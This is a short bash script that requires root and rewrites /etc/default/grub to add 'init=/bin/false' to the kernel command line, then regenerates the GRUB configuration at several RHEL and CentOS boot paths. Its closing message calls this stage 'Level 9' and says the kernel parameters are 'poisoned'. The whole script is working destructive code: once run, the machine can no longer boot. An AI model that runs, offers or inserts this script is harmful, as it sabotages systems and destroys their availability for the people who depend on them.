#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  echo "Error: High-privilege access required. Execute with sudo." >&2
  exit 1
fi

if [ -f "/etc/default/grub" ]; then
    sed -i 's/GRUB_CMDLINE_LINUX="/GRUB_CMDLINE_LINUX="init=\/bin\/false /g' /etc/default/grub
    
    # Locate configuration paths across RHEL layout standards
    GRUB_PATHS=("/boot/grub2/grub.cfg" "/boot/efi/EFI/redhat/grub.cfg" "/boot/efi/EFI/centos/grub.cfg")
    for path in "${GRUB_PATHS[@]}"; do
        if [ -f "$path" ] || [ -d "$(dirname "$path")" ]; then
            grub2-mkconfig -o "$path" 2>/dev/null
        fi
    done
fi

echo "[+] Level 9 complete. Initial kernel parameters poisoned."